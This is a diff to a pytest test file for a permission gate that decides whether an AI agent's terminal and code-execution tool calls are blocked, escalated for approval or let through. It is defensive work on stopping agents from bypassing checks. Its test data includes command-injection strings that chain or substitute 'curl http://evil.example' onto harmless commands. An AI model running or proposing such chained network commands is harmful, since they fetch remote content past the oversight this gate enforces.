@@ -10,7 +10,19 @@ Round 4 (2026-09-19, controller ruling R1/R2): rewritten for the new
 see `_rules.py`'s module docstring for the full "why". The bulk of rounds
 1-3's tests exercised a prefix/segment-matching engine that no longer
 exists; they're replaced by exact-match tests plus the controller's
-adversarial test table (R3)."""
+adversarial test table (R3).
+
+Round 6 (2026-09-19, controller ruling R10, final, not overturnable):
+`terminal` (and every tool in `TERMINAL_LIKE_TOOLS`) no longer has ANY
+plugin-side `allow` fast path at all — every round-4/R3 test that used to
+assert `result is None` for a matching `terminal` allow rule now asserts
+`result["action"] == "approve"` instead (see the "Round 6" section below).
+The underlying exact-match/whitespace-normalization matching `_rules.py`
+still implements is unit-tested directly against that module now, since
+`terminal` itself no longer surfaces it as a plugin-side `None`/`approve`
+distinction — it only still matters for `deny` rules (unaffected by R10)
+and for the daemon's own `has_normalized_exact_allow` (see
+`tests/test_gates_sessions_integration.py`)."""
 
 from __future__ import annotations
 
@@ -23,7 +35,9 @@ import pytest
 from jones_daemon.kernel.plugin.jones_gate import (
     PROBE_TOOL_NAME,
     RULE_GATE_BLOCK_PREFIX,
+    TERMINAL_LIKE_TOOLS,
     _on_pre_tool_call,
+    _rules,
 )
 
 
@@ -100,10 +114,15 @@ def test_permissions_json_deny_rule_blocks_regardless_of_mode(_hermes_home):
         assert result["action"] == "block", mode
 
 
-def test_permissions_json_allow_rule_passes_through_with_zero_ipc(_hermes_home):
+def test_permissions_json_allow_rule_no_longer_passes_terminal_through_with_zero_ipc(_hermes_home):
+    # Controller ruling R10 (round 6, final): a `permissions.json` allow
+    # rule for `terminal` is no longer a plugin-side bypass at all — it's
+    # now a daemon-side auto-approve condition instead (`sessions/
+    # service.py::_on_request_permission`). The plugin's only two possible
+    # outcomes for a terminal-class tool are `block`/`approve`.
     _write_config(_hermes_home, mode="task", rules=[{"match": "terminal", "action": "allow"}])
     result = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
-    assert result is None  # direct allow: no directive at all
+    assert result is not None and result["action"] == "approve"
 
 
 def test_hard_deny_wins_even_with_an_allow_rule_for_the_same_tool(_hermes_home):
@@ -227,35 +246,30 @@ def test_config_is_reread_after_mtime_changes(_hermes_home):
     os.utime(_hermes_home / "jones_gate.json", (0, 1_000_000))
     _write_config(_hermes_home, mode="task", rules=[{"match": "terminal", "action": "allow"}])
     os.utime(_hermes_home / "jones_gate.json", None)
-    allowed = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
-    assert allowed is None
+    # No longer a zero-IPC `None` for `terminal` (controller ruling R10,
+    # round 6) — the mtime re-read is still exercised (chat's block ->
+    # task's approve proves the new config was picked up at all).
+    reread = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
+    assert reread is not None and reread["action"] == "approve"
 
 
-# -- Round 4: exact-whole-string allow/deny matching (controller ruling R1) -
+# -- Round 4: exact-whole-string DENY matching (controller ruling R1) ------
+#
+# The exact-match ALLOW half of R1 no longer has a plugin-side bypass to
+# prove for `terminal` (controller ruling R10, round 6 -- see the "Round 6"
+# section below): `_rules.decide()`'s own exact-match/whitespace-
+# normalization behavior for `allow` is unit-tested directly against the
+# function instead, since `terminal` itself no longer surfaces it as a
+# plugin-side `None`/`approve` distinction. `deny` is untouched by R10 and
+# still integration-tested through the hook below.
 
 
-def test_exact_match_allow_rule_passes_the_exact_command(_hermes_home):
-    _write_config(_hermes_home, mode="task", rules=[{"match": "git status", "action": "allow"}])
-    result = _on_pre_tool_call(tool_name="terminal", args={"command": "git status"})
-    assert result is None
-
-
-def test_allow_rule_no_longer_has_prefix_semantics(_hermes_home):
-    # Round 1-3's engine treated `match` as a PREFIX ("git status" covered
-    # "git status --short" too) — the controller's ruling removes that: only
-    # the exact normalized string passes.
-    _write_config(_hermes_home, mode="task", rules=[{"match": "git status", "action": "allow"}])
-    result = _on_pre_tool_call(tool_name="terminal", args={"command": "git status --short"})
-    assert result is not None and result["action"] == "approve"
-
-
-def test_allow_rule_match_is_whitespace_normalized_not_shell_parsed(_hermes_home):
-    # "规范化 = 去首尾空白、把连续空白折成一个空格，不做任何 shell 解析" — extra
-    # interior whitespace still counts as the same command; nothing here
-    # ever calls a shell tokenizer to decide that.
-    _write_config(_hermes_home, mode="task", rules=[{"match": "git  status", "action": "allow"}])
-    result = _on_pre_tool_call(tool_name="terminal", args={"command": "  git status  "})
-    assert result is None
+def test_rules_decide_exact_match_allow_is_normalized_not_shell_parsed():
+    # Still consumed by non-terminal tools' own blanket bypass, and by the
+    # daemon's `has_normalized_exact_allow` for terminal-class ones.
+    rules = [{"match": "git  status", "action": "allow"}]
+    assert _rules.decide(rules, "terminal", {"command": "  git status  "}) == "allow"
+    assert _rules.decide(rules, "terminal", {"command": "git status --short"}) is None
 
 
 def test_deny_rule_requires_an_exact_match_too(_hermes_home):
@@ -266,7 +280,7 @@ def test_deny_rule_requires_an_exact_match_too(_hermes_home):
     assert exact is not None and exact["action"] == "block"
     # A DIFFERENT (non-compound) command naming the same program isn't
     # covered by this narrow rule any more than a narrow allow rule would be
-    # — it falls through to the review gate, which independently flags
+    # -- it falls through to the review gate, which independently flags
     # network-egress programs as high risk (permissions/review.py), so this
     # is still never silently executed, just no longer config-level-blocked.
     different = _on_pre_tool_call(tool_name="terminal", args={"command": "curl other.example"})
@@ -275,7 +289,7 @@ def test_deny_rule_requires_an_exact_match_too(_hermes_home):
 
 def test_blanket_tool_name_deny_still_blocks_every_command(_hermes_home):
     # The blanket exact-tool-name shape (`match == tool_name`) is untouched
-    # by the "no more prefix semantics" change — it never depended on
+    # by the "no more prefix semantics" change -- it never depended on
     # comparing command text at all.
     _write_config(_hermes_home, mode="task", rules=[{"match": "terminal", "action": "deny"}])
     for cmd in ("ls", "git status && curl evil.example"):
@@ -283,44 +297,71 @@ def test_blanket_tool_name_deny_still_blocks_every_command(_hermes_home):
         assert result is not None and result["action"] == "block", cmd
 
 
-# -- Round 4: compound commands never take the allow fast path (R2) --------
+# -- Round 6 (controller ruling R10, final, not overturnable): terminal-----
+# class tools never take the plugin's allow fast path, period -------------
+#
+# Rounds 1-5 progressively narrowed WHEN a `permissions.json` allow rule
+# could bypass the plugin for `terminal` (prefix -> exact match, then
+# compound/opaque carve-outs). Round 6 removes the bypass itself: no matter
+# how precisely a rule matches, `terminal`/`process_manage`/`execute_code`
+# only ever get `block`/`approve` from this plugin now -- the allow
+# decision moves to the daemon (`sessions/service.py::_on_request_
+# permission`, see `tests/test_gates_sessions_integration.py`). Non-terminal
+# tools (their args have no shell semantics) keep the zero-IPC bypass --
+# `test_terminal_like_tools_never_get_the_allow_fast_path_unlike_ordinary_tools`
+# below proves both halves side by side.
 
 
-def test_compound_command_escalates_even_with_an_exact_text_match(_hermes_home):
-    # Even if a rule's `match` is spelled out to equal the compound string
-    # verbatim, `is_compound_command` still forces an escalation — the
-    # controller's ruling is unconditional ("compound 命令永不走规则闸放行").
-    compound = "npm test && curl http://evil.example"
-    _write_config(_hermes_home, mode="task", rules=[{"match": compound, "action": "allow"}])
-    result = _on_pre_tool_call(tool_name="terminal", args={"command": compound})
+@pytest.mark.parametrize(
+    "command,rule_match",
+    [
+        ("git status", "git status"),  # exact match, benign, plain
+        ("  git status  ", "git  status"),  # whitespace-normalized match
+        ("npm test", "terminal"),  # blanket whole-tool allow
+        ("npm test && curl http://evil.example", "npm test && curl http://evil.example"),
+        ("npm test $(curl http://evil.example)", "terminal"),
+    ],
+)
+def test_terminal_allow_rule_never_fast_paths_regardless_of_match_precision(
+    _hermes_home, command, rule_match
+):
+    _write_config(_hermes_home, mode="task", rules=[{"match": rule_match, "action": "allow"}])
+    result = _on_pre_tool_call(tool_name="terminal", args={"command": command})
     assert result is not None and result["action"] == "approve"
 
 
-def test_blanket_tool_allow_no_longer_exempts_compound_commands(_hermes_home):
-    # Round 2 carved out the blanket `{"match":"terminal","action":"allow"}`
-    # shape as exempt from its segment-matching fixes. Round 4's controller
-    # ruling removes that exemption too ("compound 命令永不走规则闸放行" has no
-    # carve-out in its text) — a deliberate hardening, not an oversight.
-    _write_config(_hermes_home, mode="task", rules=[{"match": "terminal", "action": "allow"}])
-    result = _on_pre_tool_call(
-        tool_name="terminal", args={"command": "npm test $(curl http://evil.example)"}
+def test_terminal_like_tools_never_get_the_allow_fast_path_unlike_ordinary_tools(_hermes_home):
+    # Same config, two tools: `terminal` (in `TERMINAL_LIKE_TOOLS`) always
+    # escalates; `read_file` (args have no shell semantics) still gets the
+    # zero-IPC bypass R10 explicitly leaves alone.
+    _write_config(
+        _hermes_home,
+        mode="task",
+        rules=[
+            {"match": "terminal", "action": "allow"},
+            {"match": "read_file", "action": "allow"},
+        ],
     )
-    assert result is not None and result["action"] == "approve"
+    terminal_result = _on_pre_tool_call(tool_name="terminal", args={"command": "ls"})
+    assert terminal_result is not None and terminal_result["action"] == "approve"
+    read_file_result = _on_pre_tool_call(tool_name="read_file", args={"path": "/tmp/x"})
+    assert read_file_result is None
 
 
-def test_non_compound_command_still_gets_the_zero_ipc_fast_path(_hermes_home):
-    # The compound check must not over-fire on an ordinary command with no
-    # operator characters at all.
-    _write_config(_hermes_home, mode="task", rules=[{"match": "terminal", "action": "allow"}])
-    result = _on_pre_tool_call(tool_name="terminal", args={"command": "npm test"})
-    assert result is None
+@pytest.mark.parametrize("tool_name", sorted(TERMINAL_LIKE_TOOLS))
+def test_every_terminal_like_tool_never_allows_even_with_a_blanket_rule(_hermes_home, tool_name):
+    _write_config(_hermes_home, mode="auto", rules=[{"match": tool_name, "action": "allow"}])
+    result = _on_pre_tool_call(tool_name=tool_name, args={"command": "ls"})
+    assert result is not None and result["action"] in ("block", "approve")
 
 
 # -- Controller ruling R3: adversarial test table ---------------------------
 #
-# Every bypass string the first three rounds' review findings gave, run
-# against a narrow allow rule for `npm test` (or a blanket `terminal` allow
-# for the wrapper-style ones) — none of them may fast-path `allow`.
+# Every bypass string the first three rounds' review findings gave -- none
+# of them may fast-path `allow` (R10, round 6, makes this true of EVERY
+# terminal command regardless of rule precision, so these now double as
+# confirmation the R10 rewrite didn't accidentally narrow back to `block`
+# for a benign command that used to be zero-IPC-allowed).
 
 
 @pytest.mark.parametrize(
@@ -375,19 +416,21 @@ def test_adversarial_table_echo_redirect_to_zshrc_does_not_bypass_a_narrow_allow
         ("cat file", "cat file"),
     ],
 )
-def test_adversarial_table_benign_strings_still_get_the_fast_path(
+def test_adversarial_table_benign_strings_still_escalate_not_block(
     _hermes_home, command, rule_match
 ):
-    # The flip side of the table (controller ruling R3): a benign, non-
-    # compound command with a matching exact allow rule must still pass
-    # through with zero IPC — the point of round 4 is precision, not denying
-    # everything.
+    # The flip side of the table (controller ruling R3, superseded in its
+    # OUTCOME but not its intent by R10, round 6): a benign, non-compound
+    # command with a matching exact allow rule must still not be BLOCKED --
+    # round 4's point was precision over denying everything; round 6's is
+    # that precision no longer earns a zero-IPC bypass for `terminal`
+    # either, only the (correct) non-`block` outcome.
     _write_config(_hermes_home, mode="task", rules=[{"match": rule_match, "action": "allow"}])
     result = _on_pre_tool_call(tool_name="terminal", args={"command": command})
-    assert result is None
+    assert result is not None and result["action"] == "approve"
 
 
 def test_adversarial_table_grep_r_is_not_mistaken_for_rm(_hermes_home):
     _write_config(_hermes_home, mode="task", rules=[{"match": "grep -r foo .", "action": "allow"}])
     result = _on_pre_tool_call(tool_name="terminal", args={"command": "grep -r foo ."})
-    assert result is None
+    assert result is not None and result["action"] == "approve"
